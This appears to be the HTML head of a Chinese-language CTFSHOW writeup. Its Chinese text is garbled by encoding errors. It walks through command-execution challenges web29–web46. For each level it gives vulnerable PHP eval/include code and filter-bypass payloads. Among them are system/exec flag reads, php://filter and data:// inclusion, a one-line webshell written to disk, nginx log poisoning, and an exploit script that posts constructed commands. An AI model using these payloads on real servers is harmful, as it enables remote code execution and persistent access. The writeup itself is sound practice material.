<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="web29
 1&lt;?php
 2
 3/*
 4# -*- coding: utf-8 -*-
 5# @Author: h1xa
 6# @Date:   2020-09-04 00:12:34
 7# @Last Modified by:   h1xa
 8# @Last Modified time: 2020-09-04 00:26:48
 9# @email: h1xa@ctfer.com
10# @link: https://ctfer.com
11
12*/
13
14error_reporting(0);
15if(isset($_GET[&#39;c&#39;])){
16    $c = $_GET[&#39;c&#39;];
17    if(!preg_match(&#34;/flag/i&#34;, $c)){
18        eval($c);
19    }
20    
21}else{
22    highlight_file(__FILE__);
23}
å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.da3d1fce642585ca4a88e6246f264be963280e57889197b482bc138b96068178.css" integrity="sha256-2j0fzmQlhcpKiOYkbyZL6WMoDleIkZe0grwTi5YGgXg=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup">
  <meta property="og:description" content="web29 1&lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[&#39;c&#39;])){ 16 $c = $_GET[&#39;c&#39;]; 17 if(!preg_match(&#34;/flag/i&#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:modified_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup">
<meta name="twitter:description" content="web29
 1&lt;?php
 2
 3/*
 4# -*- coding: utf-8 -*-
 5# @Author: h1xa
 6# @Date:   2020-09-04 00:12:34
 7# @Last Modified by:   h1xa
 8# @Last Modified time: 2020-09-04 00:26:48
 9# @email: h1xa@ctfer.com
10# @link: https://ctfer.com
11
12*/
13
14error_reporting(0);
15if(isset($_GET[&#39;c&#39;])){
16    $c = $_GET[&#39;c&#39;];
17    if(!preg_match(&#34;/flag/i&#34;, $c)){
18        eval($c);
19    }
20    
21}else{
22    highlight_file(__FILE__);
23}
å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup",
      "item": "http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup",
  "name": "CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup",
  "description": "web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "web29 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚\nè¿›è¡Œç»•è¿‡å°±è¡Œï¼Œè§£æ³•å¾ˆå¤š\nc=system(â€œcat fl*g.php | grep -E â€˜fl.gâ€™ â€œ);\nc=system(â€œtac fl*g.phpâ€);\nc=system(â€œcat fl*g.phpâ€);ï¼ˆç”¨catè¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°å›æ˜¾ï¼‰\nc=system(â€œcp fl*g.php a.txt â€œ);ï¼ˆè®¿é—®a.txtæŸ¥çœ‹ï¼‰\nc=system(â€™echo -e \" \u003c?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \" \u003e a.phpâ€™); //ç›´æ¥æ–°å»ºä¸€ä¸ªé¡µé¢å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ ï¼ˆ/a.php?c=system(â€œtac flag.phpâ€);ï¼‰\n?c=echo `tac fla*`;\nâ€¦.\nweb30 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­—flagï¼Œsystemè¿˜æœ‰phpï¼Œç”±äºè¿‡æ»¤äº†systemæˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\npayload:\nc=printf(exec(â€œcat%20fl*â€));\nc=echo exec(â€œcat f\\lag.p\\hpâ€);\nc=show_source(scandir(â€.â€)[2]); (è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•é¡¹çš„æ•°ç»„)\nc=highlight_file(next(array_reverse(scandir(â€.â€))));\nc=passthru(â€œtac fla*â€);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(â€œtac fla*â€);*\nc=echo shell_exec(â€œtac fla*â€);\nc=eval($_GET[1]);\u00261=system(â€œtac flag.phpâ€);\nc=passthru(base64_decode(â€œY2F0IGZsYWcucGhw==â€));(base64ç»•è¿‡)\nâ€¦â€¦\nweb31 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u00261=system(â€œtac flag.phpâ€); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(â€œtac%09fla*â€); c=echo`tac%09fla*`; web32 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\nè¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨${IFS}å’Œ%0a ä»£æ›¿ï¼Œåˆ†å·å¯ä»¥ç”¨?\u003eä»£æ›¿\nç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nå¾—åˆ°çš„ç»“æœç”¨base64è§£ç ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†\næˆ–è€…ç”¨æ—¥å¿—æ³¨å…¥ï¼š\nurl/?c=include$_GET[1]?%3E\u00261=../../../../var/log/nginx/access.log /var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯\nweb33 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ªåŒå¼•å· /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\"\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼šï¼ˆwsmè¿˜èƒ½ç§’ï¼‰\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=|\\/|[0-9]/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®å­— /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=|/|[0-9]\nä¸æ˜¯å“¥ä»¬ï¼Œæ•°å­—ä¹Ÿè¦å±è”½ï¼Œé‚£æˆ‘æ”¹ä¸€ä¸‹ä¸å°±å¥½äº†\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[m]?\u003e\u0026m=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[m]?\u003e\u0026m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} ä¸æ˜¯å“¥ä»¬ï¼Œæ€ä¹ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«\npayloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|php|file/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c.\".php\"); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„cåé¢æ‹¼æ¥ä¸€æ®µ.php\næˆ‘ä»¬åªéœ€è¦åœ¨åŠ å…¥\u003c?php ?\u003eé‚£ä¹ˆphpå°±åªä¼šæ‰§è¡Œä¸­é—´çš„ä»£ç ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ\næ•…payloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /[0-9]|~|`|@|#|\\$|%|^|\u0026|*|\\ï¼ˆ|\\ï¼‰|-|=|+|{|[|]|}|:|'|\"|,|\u003c|.|\u003e|/|?|\\\\\nè¿™é‡Œè¦ä½¿ç”¨æ— å‚å‘½ä»¤æ‰§è¡Œ\npayloadï¼š\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nå…³äºæ— å‚å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›è§£é‡Š\nweb41 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: ç¾½ 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST['c'])){ 15 $c = $_POST['c']; 16if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i', $c)){ 17 eval(\"echo($c);\"); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u003e è¿‡æ»¤å†…å®¹ï¼š/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i\nè¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚ æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚\nå¤§ä½¬çš„è„šæœ¬\n1\u003c?php 2$myfile = fopen(\"rce_or.txt\", \"w\"); 3$contents=\"\"; 4for ($i=0; $i \u003c 256; $i++) { 5\tfor ($j=0; $j \u003c256 ; $j++) { 6 7\tif($i\u003c16){ 8\t$hex_i='0'.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u003c16){ 14\t$hex_j='0'.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i'; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \"\"; 22 } 23 24\telse{ 25\t$a='%'.$hex_i; 26\t$b='%'.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u003e=32\u0026ord($c)\u003c=126) { 29\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\"php rce_or.php\") #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ 7if(len(argv)!=2): 8 print(\"=\"*50) 9 print('USERï¼špython exp.py ') 10 print(\"egï¼š python exp.py http://ctf.show/\") 11 print(\"=\"*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\"\" 16 s2=\"\" 17 for i in arg: 18 f=open(\"rce_or.txt\",\"r\") 19 while True: 20 t=f.readline() 21 if t==\"\": 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" 30 return(output) 31 32while True: 33 param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\")) 34 data={ 35 'c':urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\"\\n[*] result:\\n\"+r.text) å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿è¡Œexp.pyå³å¯\nç¾½å¸ˆå‚…nb\næ³¨æ„é“¾æ¥è¦ç”¨httpä¸èƒ½ç”¨https\nweb42 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 18}else{ 19 highlight_file(__FILE__); 20} è¿™é“é¢˜ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸\" \u003e/dev/null 2\u003e\u00261\"è¿›è¡Œæ‹¼æ¥\n/dev/null 2\u003e\u00261 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾\nå¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸæ‰§è¡Œ\næˆ‘ä»¬å¯ä»¥é€šè¿‡%0aæˆªæ–­çš„æ–¹å¼ç»•è¿‡\ntac fl*%0a\nor\n; //åˆ†å· | //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤ || //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ \u0026 //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ \u0026\u0026 //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ\nè¿‡æ»¤äº†åˆ†å·å’Œcatï¼Œå¯ä»¥ç”¨||å’Œ\u0026æ¥ä»£æ›¿åˆ†å·ï¼Œtacä»£æ›¿cat\nå¯æ„é€ playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 æ³¨æ„ï¼Œè¿™é‡Œçš„\u0026éœ€è¦urlç¼–ç \nweb43 è¿‡æ»¤äº†catã€ï¼›ï¼Œ\nä¸æ˜¯å¾ˆå½±å“\ntac fl*%0a\ror\rtac flag.php||\r...\r//è®°å¾—è½¬urlç¼–ç  web44 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/;|cat|flag/i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flag\nå°é—®é¢˜\ntac fl*%0a\ror\rtac f*||\r...\r//è®°å¾—è½¬urlç¼–ç  web45 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flagå’Œç©ºæ ¼\nå¯ä»¥ç”¨%09æˆ–$IFS$9ä»£æ›¿ç©ºæ ¼\ntac%09fl*%0a\ror\rtac%09f*||\ror\recho$IFS`tac$IFS*`%0A\r...\r//è®°å¾—è½¬urlç¼–ç  web46 \u003c?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: h1xa\r# @Date: 2020-09-05 20:49:30\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-09-05 21:50:19\r# @email: h1xa@ctfer.com\r# @link: https://ctfer.com\r*/\rif(isset($_GET['c'])){\r$c=$_GET['c'];\rif(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){\rsystem($c.\" \u003e/dev/null 2\u003e\u00261\");\r}\r}else{\rhighlight_file(__FILE__);\r} è¿‡æ»¤æœ‰ç‚¹å¤šå•Š\n;|cat|flag| |[0-9]|\\$|*\nä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬ä¸Šé¢˜ä½¿ç”¨çš„æ–¹æ³•å¹¶ä¸ä¼šå—åˆ°å½±å“ï¼Œå› ä¸º%09æ˜¯urlç¼–ç 